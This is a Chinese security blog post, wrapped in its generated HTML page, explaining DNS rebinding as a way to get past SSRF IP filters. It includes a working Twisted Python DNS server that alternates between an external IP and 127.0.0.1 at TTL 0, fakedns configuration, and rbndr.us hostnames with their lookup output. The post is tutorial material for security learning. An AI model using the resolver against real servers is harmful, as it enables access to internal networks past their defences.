@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://yoursite.com').hostname,
+    root: '/',
+    scheme: 'Mist',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf的目的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DNS rebinding">
+<meta property="og:url" content="http://yoursite.com/2018/01/28/DNS%20rebinding/index.html">
+<meta property="og:site_name" content="李三的剑谱">
+<meta property="og:description" content="利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf的目的。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2018/01/28/DNS%20rebinding/ssrf.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/01/28/DNS%20rebinding/digdemo.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/01/28/DNS%20rebinding/ban.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/28/DNS%20rebinding/bypass.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/28/DNS%20rebinding/dns1.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/01/28/DNS%20rebinding/kali.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/01/28/DNS%20rebinding/centos.png">
+<meta property="article:published_time" content="2018-01-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-12-21T12:17:20.777Z">
+<meta property="article:author" content="李三（cl0und）">
+<meta property="article:tag" content="ssrf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2018/01/28/DNS%20rebinding/ssrf.jpg">
+
+<link rel="canonical" href="http://yoursite.com/2018/01/28/DNS%20rebinding/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>DNS rebinding | 李三的剑谱</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="李三的剑谱" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">李三的剑谱</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/28/DNS%20rebinding/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="李三（cl0und）">
+      <meta itemprop="description" content="人若无名，便可专心练剑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="李三的剑谱">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DNS rebinding
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-01-28 00:00:00" itemprop="dateCreated datePublished" datetime="2018-01-28T00:00:00+08:00">2018-01-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-12-21 20:17:20" itemprop="dateModified" datetime="2019-12-21T20:17:20+08:00">2019-12-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web-security/" itemprop="url" rel="index">
+                    <span itemprop="name">web security</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>4.7k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>4 mins.</span>
+            </span>
+            <div class="post-description">利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf的目的。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="DNS-rebinding是啥"><a href="#DNS-rebinding是啥" class="headerlink" title="DNS rebinding是啥"></a>DNS rebinding是啥</h2><p>利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf的目的。</p>
+<p>举个例子一般，进行ssrf防御的模式如下。</p>
+<p><img src="ssrf.jpg" alt="ssrf.jpg"></p>
+<ol>
+<li>获取到输入的URL，从该URL中提取host </li>
+<li>对该host进行DNS解析，获取到解析的IP </li>
+<li>检测该IP是否是合法的，比如是否是私有IP等</li>
+<li>如果IP检测为合法的，则进入curl的阶段发包</li>
+</ol>
+<p>这样的逻辑是有问题的，因为第二次服务端完全可以不使用url就是使用已被检查过的ip。</p>
+<p>诚如前面所说同一url被用了两次，所以完全可以将TTL调到一个非常小的值，让第一次通过url拿到的ip失效，然后在curl的时候服务端必须再进行一次dns解析拿到ip，而这个ip没有被检查，于是就可以为所欲为了。<strong>在ssrf里面就是第一次解析出外网ip，第二次解析出内网ip。</strong></p>
+<h2 id="一个demo"><a href="#一个demo" class="headerlink" title="一个demo"></a>一个demo</h2><p>要实现dns重绑定一个重要的条件就是将TTL调到接近0的数字，一般的域名服务商是不允许TTL那么低的。所以只有自己搭或者自己写一个dns服务器。这里选择使用fakedns做一个简单的实验初体验。</p>
+<p>vi一个dns.conf写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A cl0und.site 12.34.56.78,127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>然后分别dig两次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @fakedns所在的ip cl0und.site</span><br></pre></td></tr></table></figure>
+
+<p><img src="digdemo.jpg" alt="digdemo.jpg"></p>
+<h2 id="完整复现"><a href="#完整复现" class="headerlink" title="完整复现"></a>完整复现</h2><p>当然比赛或者实战里面是不可能自己任意指定dns服务器解析，所以必须自己配置dns记录。貌似阿里是可以配置ns记录的。我用的国外的域名服务商貌似比较坑设置nameserver那里不允许用ip。</p>
+<p>不讲道理，纠结了半天最后在ip后面加xip.io绕过。</p>
+<p><img src="ban.png" alt="ban.png"></p>
+<p>nameserver更新的比较慢要半个小时左右。</p>
+<p><img src="bypass.png" alt="bypass.png"></p>
+<p>半个小时以后~<br><img src="dns1.jpg" alt="dns1.jpg"><br>可以看到成功是成功了，但是ttl有300实战中应该是不可接受的。但是看源码的时候发现ttl设置的1,很迷</p>
+<p>所以去网上偷了一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line">record=&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"12.34.56.78"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"127.0.0.1"</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> name+<span class="string">" ===&gt; "</span>+ip</span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
+
+<p>开始安装twisted库失败，安装之前要先装一下，备忘</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install build-essential autoconf libtool pkg-config python-opengl python-imaging python-pyrex python-pyside.qtopengl idle-python2.7 qt4-dev-tools qt4-designer libqtgui4 libqtcore4 libqt4-xml libqt4-test libqt4-script libqt4-network libqt4-dbus python-qt4 python-qt4-gl libgle3 python-dev</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install twisted&#x3D;&#x3D;16.6.0</span><br><span class="line">pip install service-identity&#x3D;&#x3D;16.0.0</span><br></pre></td></tr></table></figure>
+
+<p>后来推断应该是操作的系统的锅，空白的那一次实际上是解析出东西了的。300秒貌似是操作系统强制的（？）。</p>
+<p>但是实际上已经成功了，在kali和centos上测了一下都是这个结果。</p>
+<p><img src="kali.jpg" alt="kali.jpg"></p>
+<p><img src="centos.png" alt="centos.png"></p>
+<h2 id="不稳定的偷懒方法"><a href="#不稳定的偷懒方法" class="headerlink" title="不稳定的偷懒方法"></a>不稳定的偷懒方法</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>这个方法不需要，有自己的域名和nameserver。因为有人已经帮大家实现了。只需要把想用的<a href="https://www.adobe.com/devnet/flashplayer/articles/fplayer9_security.html" target="_blank" rel="noopener">ip转换成16进制</a>，比如想在<code>127.0.0.1</code> 和 <code>192.168.0.1</code>互换那么只需要，键入ip<code>7f000001.c0a80001.rbndr.us</code></p>
+<p>然后就是看脸了。随机试了一轮</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>在bendawang师傅的博客看到的自己设置两个A记录一个内网,一个外网。去装外网先返回内网后返回这个概率。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p>
+<p><a href="https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction?_=1485134878505" target="_blank" rel="noopener">https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction?_=1485134878505</a></p>
+<p><a href="https://github.com/taviso/rbndr/" target="_blank" rel="noopener">https://github.com/taviso/rbndr/</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>李三（cl0und）
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2018/01/28/DNS%20rebinding/" title="DNS rebinding">http://yoursite.com/2018/01/28/DNS rebinding/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ssrf/" rel="tag"># ssrf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/" rel="prev" title="记录一道题的多种解法">
+      <i class="fa fa-chevron-left"></i> 记录一道题的多种解法
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/04/08/opcache%E7%BC%93%E5%AD%98getshell/" rel="next" title="opcache缓存getshell">
+      opcache缓存getshell <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS-rebinding是啥"><span class="nav-number">1.</span> <span class="nav-text">DNS rebinding是啥</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一个demo"><span class="nav-number">2.</span> <span class="nav-text">一个demo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整复现"><span class="nav-number">3.</span> <span class="nav-text">完整复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不稳定的偷懒方法"><span class="nav-number">4.</span> <span class="nav-text">不稳定的偷懒方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#法一"><span class="nav-number">4.1.</span> <span class="nav-text">法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#法二"><span class="nav-number">4.2.</span> <span class="nav-text">法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">李三（cl0und）</p>
+  <div class="site-description" itemprop="description">人若无名，便可专心练剑</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://7o8v.me/" title="http:&#x2F;&#x2F;7o8v.me&#x2F;" rel="noopener" target="_blank">7o8v☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://evoa.me/" title="https:&#x2F;&#x2F;evoa.me&#x2F;" rel="noopener" target="_blank">evoA☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://kkdlong.win/" title="http:&#x2F;&#x2F;kkdlong.win&#x2F;" rel="noopener" target="_blank">kkdlong☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.l0ca1.xyz/" title="https:&#x2F;&#x2F;blog.l0ca1.xyz&#x2F;" rel="noopener" target="_blank">l0cal☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.lmxspace.com/" title="http:&#x2F;&#x2F;www.lmxspace.com&#x2F;" rel="noopener" target="_blank">l1nk3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/iamstudy/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;iamstudy&#x2F;" rel="noopener" target="_blank">l3m0n☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://8sec.cc/" title="http:&#x2F;&#x2F;8sec.cc&#x2F;" rel="noopener" target="_blank">裤衩哥的小屋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://abcdefghijklmnopqrst.xyz/" title="http:&#x2F;&#x2F;abcdefghijklmnopqrst.xyz" rel="noopener" target="_blank">骑麦兜看落日☘️</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李三（cl0und）</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">153k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">2:19</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.1.1
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.6.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
